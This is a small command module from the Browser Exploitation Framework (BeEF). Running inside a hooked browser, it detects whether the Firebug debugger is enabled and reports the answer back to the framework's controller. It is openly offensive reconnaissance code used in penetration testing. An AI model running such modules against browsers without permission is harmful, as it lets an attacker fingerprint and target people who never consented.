//
// Copyright (c) 2006-2024 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	var result = "Not in use or not installed";
	if (window.console && (window.console.firebug || window.console.exception)) result = "Enabled and in use!";
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "firebug="+result);
});

